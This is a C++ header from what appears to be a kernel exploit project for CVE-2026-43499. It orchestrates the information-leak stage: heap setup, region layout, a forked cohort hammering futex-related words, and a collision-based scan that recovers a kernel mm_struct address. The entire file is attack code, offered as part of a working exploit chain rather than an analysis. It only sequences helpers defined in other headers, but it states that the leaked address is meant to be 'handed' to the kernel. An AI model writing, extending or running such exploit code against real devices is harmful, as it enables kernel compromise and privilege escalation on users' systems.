#pragma once
/** @file backend/cve_2026_43499/leak/snitch_owner.hpp
 *  The two phases of a leak search, in order, with one owner.
 *
 *  The parts of a search are all here already: the shape it runs with, the child that pokes the
 *  counter, the patience it waits with, the region it lays out and the rule that reads an answer.
 *  What was missing is the sequence and the ownership. The retired tree kept both in a small owner
 *  class, and its comment is the rule this one follows: the destructor is safe on every exit path,
 *  including a search that found nothing, and a forked child borrows the context and must never
 *  reset it.
 *
 *  So this holds no mechanism and decides nothing. It runs: set up, fork, poke, look for each
 *  object, and destroy. A failure at any step is reported with that step own verdict, and the
 *  discovery result is only assembled when every step answered.
 *
 *  The numbers it needs are data, per the project rule: what the device measures stays measured on
 *  the device, what the profile carries is read from the profile, and nothing here invents a value.
 */
#include <cstddef>
#include <cstdint>
#include <utility>

#include "backend/cve_2026_43499/leak/snitch_child.hpp"
#include "backend/cve_2026_43499/leak/snitch_discovery.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
#include "backend/cve_2026_43499/leak/snitch_run.hpp"
#include "backend/cve_2026_43499/leak/snitch_scan.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam.hpp"
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
#include "contract/address_discovery.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** Why a search did not produce a discovery. Each case is a step that refused. */
    enum class OwnerVerdict : unsigned char {
        Ok = 0,
        SetupRefused = 1,
        RegionRefused = 2,

        ObjectRefused = 4,
        CallFailed = 5,
        NoPokes = 6,
    };

    [[nodiscard]] constexpr const char *owner_verdict_name(OwnerVerdict verdict) noexcept {
        switch (verdict) {
            case OwnerVerdict::Ok: return "ok";
            case OwnerVerdict::SetupRefused: return "geometry-missing";
            case OwnerVerdict::RegionRefused: return "geometry-missing";
            case OwnerVerdict::CallFailed: return "call-failed";
            case OwnerVerdict::NoPokes: return "plan-missing";
            case OwnerVerdict::ObjectRefused: return "plan-missing";
        }
        return "unknown";
    }

    /** What one search did, step by step, so a caller can see which step answered. */
    struct OwnerOutcome final {
        OwnerVerdict status = OwnerVerdict::SetupRefused;
        SnitchSetupVerdict setup = SnitchSetupVerdict::GeometryMissing;
        RegionVerdict region = RegionVerdict::GeometryMissing;
        ScanVerdict poke = ScanVerdict::GeometryMissing;
        std::size_t rounds = 0U;
        std::size_t pokes_wanted = 0U;
        /** The discovery, complete only when status is Ok. */
        contract::AddressDiscoveryResult discovery{};
    };

    /**
     *  One search, from the inputs the caller measured and read to a discovery or a refusal.
     *
     *  @tparam Seam       The heap and snitch operations. Deliberately not defaulted: the device
     *                     one lives in a header that includes linux/futex.h and cannot be compiled
     *                     on the host, and this file has to compile there. The caller at the edge
     *                     supplies the real one; a test supplies a recording one.
     *  @tparam Buckets    The collision buckets the rule compares against.
     *  @param inputs      What the shape is built from: device measurements and profile numbers.
     *  @param region      What the region is laid out from.
     *  @param patience    How long the poke protocol waits.
     *  @param counter_offset Where the poke counter sits, from the caller's header layout.
     *  @param words       The words the cohort hammers.
     *  @param word_count  How many there are.
     *  @param strides     The scan strides, and the range they walk.
     *  @param range       The range the object search walks.
     *  @param sweep_tags  Whether the search sweeps the tag nibble.
     *  @param buckets     The collision buckets.
     *  @param addresses   The addresses the rule compares against.
     *  @param address_count How many there are.
     *  @param collisions_needed How many of the armed addresses must agree.
     *  @return            The outcome. When it is Ok the discovery is complete; otherwise it is the
     *                     canonical failure and the step that refused is named in the outcome.
     *  @note              The child borrows nothing that outlives the call: the poke protocol forks
     *                     and reaps inside itself, so no child can outlive this function. The
     *                     destructor of anything created here runs on every exit path.
     */
    template <class Seam, class Buckets>
    [[nodiscard]] OwnerOutcome run_snitch_owner(const SnitchInputs &inputs, const RegionInputs &region,
                                                const SnitchPatience &patience,
                                                std::size_t counter_offset,
                                                std::uint32_t *const *words, std::size_t word_count,
                                                const ScanStrides &strides, const ScanRange &range,
                                                bool sweep_tags, const Buckets &buckets,
                                                const std::uint64_t *addresses,
                                                std::size_t address_count,
                                                std::size_t collisions_needed) noexcept {
        OwnerOutcome out{};
        /* 1. The shape. A missing or unusable input refuses the whole search rather than producing
         *    one that would step over nothing. */
        SnitchSetup setup{};
        out.setup = build_snitch_setup(inputs, setup);
        if (out.setup != SnitchSetupVerdict::Ok) {
            out.status = OwnerVerdict::SetupRefused;
            out.discovery = contract::discovery_failed();
            return out;
        }
        /* 2. The region, laid out before anything is poked into it. */
        RegionLayout layout{};
        out.region = layout_snitch_region(region, layout);
        if (out.region != RegionVerdict::Ok) {
            out.status = OwnerVerdict::RegionRefused;
            out.discovery = contract::discovery_failed();
            return out;
        }
        /* 3. The pokes. The protocol forks its cohort and reaps it inside itself, so no child
         *    outlives this call and nothing here has to own one. */
        const ScanOutcome poked = run_poke_protocol<Seam>(setup, region, patience, counter_offset,
                                                          words, word_count);
        out.poke = poked.status;
        out.rounds = poked.rounds;
        out.pokes_wanted = poked.pokes_wanted;
        if (poked.status != ScanVerdict::Poked) {
            out.status = poked.status == ScanVerdict::CallFailed ? OwnerVerdict::CallFailed
                                                                 : OwnerVerdict::NoPokes;
            out.discovery = contract::discovery_failed();
            return out;
        }
        /* 4. The object. One search, by the rule the caller brought; the other addresses come from
         *    searches of their own, never from a default here. */
        const ObjectOutcome found = find_object<Buckets>(strides, range, sweep_tags, buckets, addresses,
                                                        address_count, collisions_needed);
        if (found.status != ObjectVerdict::Found || found.object == 0U) {
            out.status = OwnerVerdict::ObjectRefused;
            out.discovery = contract::discovery_failed();
            return out;
        }
        /* 5. The discovery. A partial answer is not an answer: what was not found stays zero, and
         *    discovery_is_complete is what a caller checks. */
        out.discovery.ok = true;
        out.discovery.mm_struct = found.object;
        if (!contract::discovery_is_complete(out.discovery)) {
            out.status = OwnerVerdict::ObjectRefused;
            out.discovery = contract::discovery_failed();
            return out;
        }
        out.status = OwnerVerdict::Ok;
        return out;
    }

    /**
     *  The contract result an owner outcome means.
     *
     *  A pure mapping and nothing else, which is the shape the contract asks for: a discovery that
     *  did not succeed reports so and reports nothing else. It holds no state on purpose -- the
     *  discovery result file says why in its own words, that an adapter keeping the outcome itself
     *  would be a mutable global by another name -- so the caller keeps the outcome and this turns
     *  it into the two things the contract separates: whether the mechanism worked, and whether all
     *  four addresses are known.
     *
     *  @param outcome What the sequence did, including the step that refused.
     *  @return        A complete result when the sequence finished and the search found its object;
     *                 the canonical failure otherwise, with no partial field exposed.
     *  @note          The canonical form comes from the same call the retired tree used, so a leaked
     *                 address becomes one the kernel can be handed, or nothing does.
     */
    [[nodiscard]] constexpr contract::AddressDiscoveryResult discovery_of(
        const OwnerOutcome &outcome) noexcept {
        if (outcome.status != OwnerVerdict::Ok || !outcome.discovery.ok) {
            return contract::discovery_failed();
        }
        /* The sequence filled the object address already; the check below is what decides whether
         *  that is an answer, and a result that fails it is not handed on half-filled. */
        if (!contract::discovery_is_complete(outcome.discovery)) {
            return contract::discovery_failed();
        }
        return outcome.discovery;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak